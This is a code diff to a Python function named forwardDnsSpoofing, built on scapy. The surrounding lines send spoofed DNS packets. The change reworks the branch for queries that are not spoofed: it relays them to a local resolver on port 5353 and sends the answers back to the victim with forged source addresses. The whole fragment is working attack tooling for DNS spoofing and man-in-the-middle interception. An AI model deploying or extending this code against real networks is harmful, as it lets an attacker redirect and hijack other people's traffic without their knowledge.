@@ -45,17 +45,19 @@ def forwardDnsSpoofing(spooferIP):
             scapy.send(spoofedPacket, verbose=1)
             print('DNS Spoofed')
         else:
-            print('DNS Forwarding') 
-            scapy.send(orgPacket, verbose=1)
+            print('DNS Forwarding')
+            newPacket = orgPacket
+            newPacket[IP].src = '127.0.0.1'
+            newPacket[IP].dst = '127.0.0.1'
+            newPacket[UDP].dport = 5353
+            newPacket[UDP].sport = 5353
+            answer = scapy.sr1(newPacket)
+            answer[IP].src = orgPacket[IP].dst
+            answer[IP].dst = orgPacket[IP].src
+            answer[UDP].sport = orgPacket[UDP].dport
+            answer[UDP].dport = orgPacket[UDP].sport
+            scapy.send(answer, verbose=1)
             print('DNS Forwarded')
-            # packet= packet / scapy.UDP(sport=orgPacket[UDP].sport, dport=53)
-            # packet= packet / scapy.DNS(rd=1, id=orgPacket[DNS].id, qd=DNSQR(qname=orgPacket[DNSQR].qname))
-            # answer = scapy.sr1(packet, verbose=0)
-            # print('Repsonse received')
-            # responsePacket = IP(dst=orgPacket[IP].src, src=orgPacket[IP].dst) / UDP(dport=orgPacket[UDP].sport, sport=53) / DNS()
-            # responsePacket[DNS] = answer[DNS]
-            # responsePacket.show()
-            # scapy.send(responsePacket, verbose=0)
     print('DNS spoofing started')
     return forwardDNS
 
